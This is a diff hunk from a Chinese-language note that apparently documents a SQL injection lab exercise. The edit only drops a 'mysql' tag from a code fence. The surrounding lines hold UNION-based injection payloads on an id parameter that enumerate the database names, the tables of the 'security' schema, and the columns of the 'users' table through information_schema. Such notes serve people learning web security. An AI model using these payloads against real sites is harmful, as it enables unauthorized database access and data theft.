@@ -24,7 +24,7 @@
 
 + 先获取数据库信息、数据库表名信息、表的列名信息、最后成功显示出表中的信息
 
-~~~mysql
+~~~
 ?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata # //枚举数据库
 ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'security' %23 //枚举数据库所有表名
 ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' %23  //枚举users表中的所有列名
